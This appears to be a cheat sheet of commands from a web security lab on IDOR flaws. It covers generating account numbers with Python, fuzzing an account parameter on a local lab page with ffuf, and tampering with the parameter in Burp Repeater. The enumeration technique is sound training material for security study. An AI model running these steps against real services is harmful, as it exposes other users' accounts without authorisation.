
# Commands Used in Lab 4 🛠️

## Python Script for Payload Generation
1. **Generate Account Numbers:**
   ```python
   for i in range(1, 5000):
       print(i)
   ```
   - Save the output to a file:
     ```bash
     python3 numbers.py > nums.txt
     ```

## FFUF for Automating IDOR Testing
1. **Basic FFUF Command:**
   ```bash
   ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w nums.txt -mr 'admin'
   ```
   - **Explanation:**
     - `FUZZ`: Placeholder for account numbers.
     - `-mr 'admin'`: Match responses containing the keyword "admin."

## Burp Suite for Manual Testing
1. **Intercept and Modify Request:**
   - Capture the request:
     ```
     GET /labs/e0x02.php?account=1009 HTTP/1.1
     ```
   - Modify the parameter in Burp Suite Repeater:
     ```
     account=1009 → account=1001
     ```
